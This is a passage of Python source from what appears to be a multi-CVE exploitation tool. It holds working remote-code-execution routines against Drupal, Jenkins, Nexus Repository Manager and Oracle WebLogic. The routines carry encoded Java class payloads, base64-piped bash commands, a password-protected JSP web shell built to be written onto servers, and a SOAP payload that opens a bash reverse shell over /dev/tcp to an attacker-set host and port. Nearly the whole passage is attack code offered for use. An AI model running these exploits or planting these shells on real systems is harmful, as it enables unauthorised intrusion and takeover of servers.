            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2019_6340(self):
        self.pocname = "Drupal: CVE-2019-6340"
        self.method = "post"
        self.rawdata = "null"
        self.info = color.rce()
        self.r = "PoCWating"
        self.path = "/node/?_format=hal_json"
        self.cmd_len = len(CMD)
        self.payload = self.payload_cve_2019_6340 % (self.cmd_len, CMD, self.url)
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Connection': "close",
            'Content-Type': "application/hal+json",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        try:
            if VULN is None:
                self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, 
                    timeout=TIMEOUT, verify=False)
                if r"LISTEN" not in self.request.text:
                    if r"uid=" not in self.request.text:
                        if self.request.status_code == 403 and r"u0027access" in self.request.text:
                            self.r = "PoCSuCCeSS"
                            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                    else:
                        verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
                else:
                    verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, 
                    timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                self.r = self.request.text.split("}")[1]
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  

class Jenkins():
    def __init__(self, url):
        self.url = url
        self.payload_cve_2018_1000861 = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.' \
            'scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+' \
            'x+%7B%0A++public+x%28%29%7B%0A++++%22bash+-c+%7Becho%2CRECOMMAND%7D%7C%7Bbase64%2C-d%7D%7C%7B' \
            'bash%2C-i%7D%22.execute%28%29%0A++%7D%0A%7D'
            
    def cve_2017_1000353(self):
        self.pocname = "Jenkins: CVE-2017-1000353"
        self.method = "get"
        self.rawdata = "null"
        self.info = color.rce()
        self.cmd = urllib.parse.quote(CMD)
        self.r = "PoCWating"     
        try:
            if VULN is None:
                self.request = requests.get(self.url, headers=headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                self.jenkins_version = self.request.headers['X-Jenkins']
                self.jenkinsvuln = "2.56"
                self.jenkinsvuln_lts = "2.46.1"
                self.jver = self.jenkins_version.replace(".","")
                self.jenkins_lts = int(self.jver)
                if self.jenkins_version.count(".",0,len(self.jenkins_version)) == 1:
                    if self.jenkins_version <= self.jenkinsvuln:
                        self.info += color.green(" [version:" + self.jenkins_version + "]")
                        self.r = "PoCSuCCeSS"
                elif self.jenkins_version.count(".",0,len(self.jenkins_version)) == 2:
                    if self.jenkins_lts <= 2461:
                        self.info += color.green(" [version:lts" + self.jenkins_version + "]")
                        self.r = "PoCSuCCeSS"
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                pass
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)     
    
    def cve_2018_1000861(self):
        self.pocname = "Jenkins: CVE-2018-1000861"
        self.method = "get"
        self.rawdata = "null"
        self.c_echo = "echo \":-)\" > $JENKINS_HOME/war/robots.txt;"+CMD+" >> $JENKINS_HOME/war/robots.txt"
        self.c_base = base64.b64encode(str.encode(self.c_echo))
        self.c_cmd = self.c_base.decode('ascii')
        self.cmd = urllib.parse.quote(self.c_cmd)
        self.payload = self.payload_cve_2018_1000861.replace("RECOMMAND", self.cmd)
        self.info = color.rce()
        try:
            try:
                self.request = requests.get(self.url, timeout=TIMEOUT, verify=False)
                self.jenkins_version = self.request.headers['X-Jenkins']
                self.info += color.green(" [version:" + self.jenkins_version + "]")
            except:
                pass
            self.request = requests.get(self.url + self.payload, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            self.request = requests.get(self.url + "/robots.txt", timeout=TIMEOUT, verify=False)
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)            

class Nexus():
    def __init__(self, url):
        self.url = url
        self.payload_cve_2019_7238 = "{\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [{" \
            "\"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0, \"filter\": [{\"property\":" \
            " \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"function(x, y, z, c" \
            ", integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe00" \
            "00003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a00620" \
            "0630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00" \
            "700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007" \
            "e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c65010012" \
            "4c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b0100047465737" \
            "4010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b" \
            "0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a617" \
            "6612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b01000672657375" \
            "6c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b01000" \
            "56669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e" \
            "7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c64010005746" \
            "1626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e" \
            "6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e7" \
            "3650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c6554" \
            "7970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536" \
            "f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c00" \
            "8a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116" \
            "a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099" \
            "009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a617" \
            "6612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c" \
            "009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e487474704" \
            "36f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00" \
            "a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e7365010009676574577" \
            "2697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f54657374" \
            "3233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a6765745" \
            "2756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e67" \
            "2f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f636573730100077" \
            "7616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e707574537472" \
            "65616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b424" \
            "9492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e745468726561640100142829" \
            "4c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294" \
            "c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f53" \
            "7472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c65637" \
            "42f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f" \
            "626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790" \
            "100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f" \
            "626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e6" \
            "72f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c730100" \
            "15284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f53747" \
            "2696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100" \
            "186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626" \
            "a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010005777269746501" \
            "0005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002" \
            "a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb8" \
            "00022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120" \
            "b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6" \
            "001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003" \
            "e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a7" \
            "0009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001" \
            "db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b6" \
            "00241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001" \
            "f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a500" \
            "3200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb00400111004101180" \
            "0420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000" \
            "000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004" \
            "200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00" \
            "c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb00430" \
            "04b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e300420051" \
            "0008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005" \
            "300010054000000020055';   y=0;   z='';   while (y lt x.length()){   z += c.toChars(integer.parseInt(x.s" \
            "ubstring(y, y+2), 16))[0];   y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass." \
            "getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader'" \
            ").invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.cl" \
            "ass,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentTy" \
            "pe()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\ny,\\n   'Exploit.Test234',\\nz.get" \
            "Bytes('latin1'),0,\\n3054\\n);x.getMethod('test', ''.class).invoke(null, 'RECOMMAND');'done!'}\\n\"}, {" \
            "\"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1}], \"method\": \"previewAsset" \
            "s\"}"
        self.payload_cve_2020_10199 = """{"name":"internal","online":true,"storage":{"blobStoreName":"default","st""" \
            """rictContentTypeValidation":true},"group":{"memberNames":["${''.getClass().forName('com.sun.org.apac""" \
            """he.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7""" \
            """f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q""" \
            """$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$""" \
            """R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41""" \
            """$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$""" \
            """_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$8""" \
            """2$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a""" \
            """$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4""" \
            """m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$s""" \
            """c$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2""" \
            """v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$z""" \
            """NM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D""" \
            """$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3""" \
            """$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb""" \
            """$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5""" \
            """$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$I""" \
            """S$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd""" \
            """$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c""" \
            """$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$""" \
            """daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59""" \
            """$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0""" \
            """t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7""" \
            """$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$""" \
            """7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_""" \
            """$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b""" \
            """0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$x""" \
            """o$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$""" \
            """95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$""" \
            """c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c""" \
            """0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c""" \
            """3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f""" \
            """5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d""" \
            """8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf""" \
            """$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$""" \
            """aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$""" \
            """dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$""" \
            """81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4""" \
            """$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k""" \
            """$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$""" \
            """3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$""" \
            """e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$""" \
            """d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm""" \
            """$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6""" \
            """$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3""" \
            """d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed""" \
            """$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}"]}}"""
    def cve_2019_7238(self):
        self.pocname = "Nexus Repository Manager: CVE-2019-7238"
        self.payload = self.payload_cve_2019_7238.replace("RECOMMAND",CMD)
        self.method = "post"
        self.rawdata = "null"
        self.info = color.rce()
        self.headers = {
            'Accept': '*/*',
            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type': 'application/json'
        }
        try:
            self.request = requests.post(self.url + "/service/extdirect", data=self.payload, headers=self.headers, 
                timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2020_10199(self):
        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
        self.pocname = "Nexus Repository Manager: CVE-2020-10199"
        self.method = "post"
        self.rawdata = "null"
        self.info = color.rce()
        self.session_headers = {
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Nexus-UI': 'true',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
        }
        try:
            self.us = base64.b64encode(str.encode(NEXUS_U))
            self.base64user = self.us.decode('ascii')
            self.pa = base64.b64encode(str.encode(NEXUS_P))
            self.base64pass = self.pa.decode('ascii')
            self.session_data = {'username': self.base64user, 'password': self.base64pass}
            self.request = requests.post(self.url + "/service/rapture/session", data=self.session_data, 
                headers=self.session_headers, timeout=20)
            self.session_str = str(self.request.headers)
            self.session = (re.search(r"NXSESSIONID=(.*); Path", self.session_str).group(1))
            self.rce_headers = {
                'Connection': "keep-alive",
                'NX-ANTI-CSRF-TOKEN': "0.6153568974227819",
                'X-Requested-With': "XMLHttpRequest",
                'X-Nexus-UI': "true",
                'Content-Type': "application/json",
                '404': "" + CMD + "",
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36",
                'Cookie': "jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520;" \
                    "NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=" + self.session + ""
            }
            self.request = requests.post(self.url + "/service/rest/beta/repositories/go/group", 
                data=self.payload_cve_2020_10199, headers=self.rce_headers)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

class OracleWeblogic():
    def __init__(self, url):
        self.url = url
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if r"https://" in self.url:
            self.url = "https://"+self.hostname+":"+str(self.port)
        if r"http://" in self.url:
            self.url = "http://"+self.hostname+":"+str(self.port)
        self.headers = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'content-type': 'text/xml'
        }
        
        self.jsp_webshell = '<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
            '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
            ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
            'tStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.cl' \
            'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
            'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
            'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'
        self.weblogic_nc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="h' \
            'ttp://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv' \
            ':Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http' \
            '://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.Strin' \
            'g" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></voi' \
            'd><void index="2"><string>bash -i &gt;&amp; /dev/tcp/REIP/REPORT 0&gt;&amp;1</string></void></array><vo' \
            'id method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soa' \
            'penv:Body></soapenv:Envelope>'
        self.payload_cve_2017_3506_poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/' \
            '"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java vers' \
            'ion="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminSer' \
            'ver/tmp/_WL_internal/wls-wsat/54p17w/war/test.log</string><void method="println"><string>:-)</string></' \
            'void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></' \
            'soapenv:Envelope>'
        self.payload_cve_2017_3506_exp = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/' \
            '"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java vers' \
            'ion="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminSer' \
            'ver/tmp/_WL_internal/wls-wsat/54p17w/war/REWEBSHELL</string><void method="println"><string><![CDATA[<% ' \
            'if("password".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(' \
            'request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"' \
            '); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>]]></string></void' \
            '><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soap' \
            'env:Envelope>'
        self.payload_cve_2017_10271 = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><' \
            'soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version' \
            '="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer' \
            '/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/REWEBSHELL</string><void method="println"><string>REPAYLO' \
            'AD</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soa' \
            'penv:Body/></soapenv:Envelope>'
        self.payload_cve_2019_2725 = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xm' \
            'lns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService' \
            '"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:w' \
            'ork="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><ob' \
            'ject class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8' \
            'tpkys/war/REWEBSHELL</string><void method="println"><string><![CDATA[<%if("password".equals(request.get' \
            'Parameter("pwd"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getI' \
